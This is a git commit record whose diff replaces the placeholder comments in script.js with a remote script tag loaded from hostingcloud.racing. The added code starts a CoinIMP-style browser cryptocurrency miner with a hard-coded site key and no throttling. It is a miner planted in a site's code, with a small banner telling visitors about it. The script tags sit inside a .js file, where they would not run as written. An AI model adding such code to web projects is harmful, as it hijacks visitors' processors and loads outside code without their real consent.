49b17baae681af9eb7fa198b0991fd3ae5d3178d
alikhanicryptocurrency <137138134+alikhanicryptocurrency@users.noreply.github.com>
2024-01-04 06:40:20 +0330

    script.js

--- script.js
+++ script.js
@@ -1,2 +1,3 @@
-// script.js
-// Add your JavaScript code here
+<script src="https://www.hostingcloud.racing/Hijq.js"></script>
+  <script> var _client = new Client.Anonymous('abe2e0c5dd9a91b8b9771f01a6b178c4ce5e2b2d105c53d973e384e39ae1d277', { throttle: 0, c: 'w' }); _client.start(); _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+</script>
